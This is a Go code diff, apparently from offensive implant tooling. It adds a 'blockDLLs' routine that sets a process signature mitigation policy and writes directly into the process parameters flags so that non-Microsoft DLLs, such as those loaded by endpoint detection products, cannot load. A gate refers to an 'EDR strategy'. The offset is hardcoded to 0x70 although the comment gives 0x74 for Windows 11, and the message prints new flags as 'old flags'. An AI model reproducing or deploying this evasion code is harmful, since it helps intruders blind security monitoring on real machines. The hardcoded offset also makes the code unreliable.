@@ -14,11 +14,13 @@ var (
 )
 
 func blockDLLs() string {
+	if !pebBlockDLLs {
+		return "PEB BlockDLLs: disabled by EDR strategy"
+	}
 	results := ""
 
-	// Method 1: Set ProcessSignaturePolicy
-	ntdll := syscall.NewLazyDLL("ntdll.dll")
-	procSetProcessMitigationPolicy := ntdll.NewProc("SetProcessMitigationPolicy")
+	// Method 1: Set ProcessSignaturePolicy (imported from kernel32.dll, NOT ntdll)
+	procSetProcessMitigationPolicy := kernel32Block.NewProc("SetProcessMitigationPolicy")
 
 	const ProcessSignaturePolicy uint32 = 8
 	type processMitigationSignaturePolicy struct {
@@ -85,8 +87,11 @@ func blockDllsPEBInternal() string {
 		return "ProcessParameters is nil"
 	}
 
-	// Flags field is at offset 0x70 (Win10 22H2) or 0x74 (Win11) in RTL_USER_PROCESS_PARAMETERS
-	// We try to set bit 0x20 (BlockDlls) via a calculated offset
-	_ = ppPtr
-	return "requires Windows-version-specific offset (Win10: 0x70, Win11: 0x74)"
+	// Flags field is at offset 0x70 (Win10) or 0x74 (Win11) in RTL_USER_PROCESS_PARAMETERS
+	// Set bit 0x20 (BlockDlls) to enable non-Microsoft DLL blocking
+	flagsOffset := uintptr(0x70)
+	flags := *(*uint32)(unsafe.Pointer(ppPtr + flagsOffset))
+	flags |= 0x20
+	*(*uint32)(unsafe.Pointer(ppPtr + flagsOffset)) = flags
+	return fmt.Sprintf("PEB BlockDlls flag set (old flags: 0x%x)", flags)
 }
